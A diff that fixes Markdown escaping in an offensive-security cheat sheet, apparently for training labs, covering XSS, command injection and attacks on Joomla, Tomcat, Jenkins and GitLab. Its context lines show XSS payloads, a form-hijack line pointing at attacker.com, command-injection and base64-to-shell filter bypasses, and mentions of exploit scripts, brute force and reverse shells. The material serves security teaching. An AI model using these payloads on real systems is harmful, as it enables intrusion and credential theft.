@@ -11,7 +11,7 @@ title: "Web Application Attacks"
 * [**Overview**](#overview) - XSS fundamentals and impact
 * [**Types of XSS**](#types-of-xss-vulnerabilities) - Stored, Reflected, DOM-based
 * [**Basic Payloads**](#basic-xss-testing-payloads) - Standard testing payloads
-* [**Alternative Payloads**](#alternative-payloads) - Bypass techniques when `<script>` is blocked
+* [**Alternative Payloads**](#alternative-payloads) - Bypass techniques when `\<script>` is blocked
 
 ### Attack Techniques
 
@@ -55,7 +55,7 @@ title: "Web Application Attacks"
 ### 🔍 **XSS Detection Flow**
 
 1. **Find input points** → Forms, URL params, headers
-2. **Test basic payload** → `<script>alert(1)</script>`
+2. **Test basic payload** → `\<script>alert(1)</script>`
 3. **Check page source** → Look for payload reflection
 4. **Verify execution** → Confirm JavaScript runs
 5. **Exploit discovered XSS** → Session hijacking, phishing
@@ -249,9 +249,9 @@ document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComp
 
 ## Alternative Payloads
 
-> Bypass techniques when `<script>` tags are blocked by filters
+> Bypass techniques when `\<script>` tags are blocked by filters
 
-### When `<script>` is Blocked
+### When `\<script>` is Blocked
 
 **Image onerror event:**
 
@@ -386,7 +386,7 @@ xsser -u "http://target.com/search?q=XSS"
 **Testing Approach:**
 
 1. **Identify input points** - All user inputs, not just forms
-2. **Submit test payload** - Use basic `<script>alert(1)</script>`
+2. **Submit test payload** - Use basic `\<script>alert(1)</script>`
 3. **Analyze response** - Check page source for payload
 4. **Verify execution** - Confirm JavaScript execution
 5. **Test variations** - Try different payload types
@@ -682,7 +682,7 @@ document.body.innerHTML = '<h1>Hacked by Attacker</h1>';
 
 ### Common Filters and Bypasses
 
-**Filter: Blocking `<script>` tags**
+**Filter: Blocking `\<script>` tags**
 
 ```html wrap
 <!-- Bypass with other tags -->
@@ -1048,8 +1048,8 @@ document.write('<form action=http://attacker.com>');
 
 **Step-by-step debugging:**
 
-1. Test basic XSS: `<script>alert(1)</script>`
-2. Test with URL parameter: `?url=<script>alert(1)</script>`
+1. Test basic XSS: `\<script>alert(1)</script>`
+2. Test with URL parameter: `?url=\<script>alert(1)</script>`
 3. Check payload encoding with online tools
 4. Verify server listening: `sudo php -S 0.0.0.0:8080`
 5. Test credential capture with manual form submission
@@ -9309,7 +9309,7 @@ ip=127.0.0.1%0a{ls,-la}
 | **Form Feed**       | `\f`                    | `%0c`           | Universal    | Low             |
 | **Base64**          | `echo X\|base64 -d\|sh` | Complex         | Unix/Linux   | Medium          |
 | **Hex Encoding**    | `printf "cmd\x20arg"`   | Complex         | Unix/Linux   | Medium          |
-| **Redirection**     | `cat<file`              | `cat%3cfile`    | Unix/Linux   | High            |
+| **Redirection**     | `cat\<file`              | `cat%3cfile`    | Unix/Linux   | High            |
 
 ### Selection Strategy
 
@@ -15903,7 +15903,7 @@ mysql -e "SELECT user_login, user_email, user_status FROM wp_users;"
 
 ### Lab 1: User Enumeration
 
-**Question:** "Perform user enumeration against <http://blog.inlanefreight.local>. Aside from admin, what is the other user present?"
+**Question:** "Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?"
 
 **Solution:**
 
@@ -16741,7 +16741,7 @@ curl -s https://developer.joomla.org/stats/server_os | jq .
 
 ### Lab 1: Version Fingerprinting
 
-**Question:** "Fingerprint the Joomla version in use on <http://app.inlanefreight.local> (Format: x.x.x)"
+**Question:** "Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)"
 
 **Solution Methodology:**
 
@@ -16763,7 +16763,7 @@ droopescan scan joomla --url http://app.inlanefreight.local
 
 ### Lab 2: Admin Password Discovery
 
-**Question:** "Find the password for the admin user on <http://app.inlanefreight.local>"
+**Question:** "Find the password for the admin user on http://app.inlanefreight.local"
 
 **Solution Methodology:**
 
@@ -17490,7 +17490,7 @@ python3 joomla_dir_trav.py --url "http://target.com/administrator/" \
 
 ### Lab: Template Injection Flag Discovery
 
-**Question:** "Leverage the directory traversal vulnerability to find a flag in the root of the <http://dev.inlanefreight.local/> Joomla application"
+**Question:** "Leverage the directory traversal vulnerability to find a flag in the root of the http://dev.inlanefreight.local/ Joomla application"
 
 **Solution Methodology (Template Injection + Reverse Shell):**
 
@@ -18655,7 +18655,7 @@ curl -I http://target.com
 
 ### Lab: Drupal Version Detection
 
-**Question:** "Identify the Drupal version number in use on <http://drupal-qa.inlanefreight.local>"
+**Question:** "Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local"
 
 **Solution Methodology:**
 
@@ -20578,7 +20578,7 @@ done
 
 ### Lab 1: Tomcat Version Detection
 
-**Question:** "What version of Tomcat is running on the application located at <http://web01.inlanefreight.local:8180>?"
+**Question:** "What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?"
 
 **Solution Methodology:**
 
@@ -21507,7 +21507,7 @@ python2.7 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/classes/com/company/config
 
 ### Lab 1: Manager Brute Force Attack
 
-**Question:** "Perform a login bruteforcing attack against Tomcat manager at <http://web01.inlanefreight.local:8180>. What is the valid username?"
+**Question:** "Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?"
 
 **Solution Methodology:**
 
@@ -21596,7 +21596,7 @@ curl -u "tomcat:admin" "http://web01.inlanefreight.local:8180/manager/text/list"
 
 ### Lab 3: Remote Code Execution & Flag Retrieval
 
-**Question:** "Obtain remote code execution on the <http://web01.inlanefreight.local:8180> Tomcat instance. Find and submit the contents of tomcat\_flag.txt"
+**Question:** "Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat\_flag.txt"
 
 **Solution Methodology:**
 
@@ -22895,7 +22895,7 @@ done
 
 ### Lab 1: Jenkins Version Detection
 
-**Question:** "Log in to the Jenkins instance at <http://jenkins.inlanefreight.local:8000>. Browse around and submit the version number when you are ready to move on."
+**Question:** "Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on."
 
 **Solution Methodology:**
 
@@ -26608,7 +26608,7 @@ GitLab is a web-based Git repository hosting tool with wiki, issue tracking, and
 
 ### Lab 1: Version Enumeration
 
-**Question:** "Enumerate the GitLab instance at <http://gitlab.inlanefreight.local>. What is the version number?"
+**Question:** "Enumerate the GitLab instance at http://gitlab.inlanefreight.local. What is the version number?"
 
 **Target:** `gitlab.inlanefreight.local` (add to `/etc/hosts`)
 
